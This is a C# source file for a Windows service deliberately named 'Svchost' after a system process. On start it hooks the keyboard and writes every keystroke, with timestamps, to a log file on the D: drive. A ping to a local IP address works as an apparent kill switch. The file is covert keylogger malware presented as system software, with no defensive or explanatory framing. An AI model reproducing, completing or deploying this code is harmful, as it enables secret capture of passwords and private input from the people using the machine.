using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace ServiceHost
{
    public partial class Svchost : ServiceBase
    {
        private string logFilePath = @"D:\keystrokes.log"; // Path to log file
        public Svchost()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            setPingListener();
            StartKeylogger();
            KeyboardHook.Start();
        }

        protected override void OnStop()
        {
            base.OnStop();
            KeyboardHook.Stop();
        }
        private void setPingListener()
        {
            Ping ping = new Ping();
            ping.PingCompleted += (sender, e) =>
            {
                if (e.Reply.Status == IPStatus.Success)
                {
                    // Shutdown logic here
                    this.Stop();
                }
            };
            ping.SendAsync("192.168.100.61", null); // Send ping asynchronously
        }
        private void StartKeylogger()
        {
            // Create or append to the log file
            EnsureLogFileExists();

            // Hook into keyboard events
            HookKeyboardEvents();
        }
        private void EnsureLogFileExists()
        {
            // Create directory if it doesn't exist
            string logDirectory = Path.GetDirectoryName(logFilePath);
            if (!Directory.Exists(logDirectory))
            {
                Directory.CreateDirectory(logDirectory);
            }

            // Create or append to the log file
            if (!File.Exists(logFilePath))
            {
                using (StreamWriter sw = File.CreateText(logFilePath))
                {
                    sw.WriteLine("Keystroke log started at " + DateTime.Now);
                }
            }
        }
        private void HookKeyboardEvents()
        {
            // Subscribe to key press event
            KeyboardHook.KeyPressed += LogKeystroke;
        }
        private void LogKeystroke(object sender, KeyPressedEventArgs e)
        {
            // Log keystroke to file
            string keystroke = e.Key.ToString();
            using (StreamWriter sw = File.AppendText(logFilePath))
            {
                sw.WriteLine($"[{DateTime.Now}] Key pressed: {keystroke}");
            }
        }
        private void log(string arg)
        {
            using (StreamWriter sw = File.AppendText(logFilePath))
            {
                sw.WriteLine("This is log: " + arg);
            }
        }
    }
}
